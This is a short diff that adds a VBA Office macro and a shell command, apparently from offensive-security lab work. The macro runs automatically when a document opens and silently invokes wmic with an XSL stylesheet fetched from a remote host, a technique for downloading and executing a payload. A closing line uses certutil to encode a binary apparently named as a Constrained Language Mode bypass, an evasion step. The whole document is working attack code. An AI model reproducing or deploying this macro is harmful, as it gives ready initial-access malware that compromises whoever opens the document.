@@ -1,0 +1,14 @@
+Sub MyMacro()
+    Shell "wmic process get brief /format:""http://192.168.45.223/payload.xsl""", vbHide 
+End Sub
+ 
+Sub Document_Open()
+    MyMacro
+End Sub
+ 
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+
+certutil -encode clm_bypass_1.exe file.txt
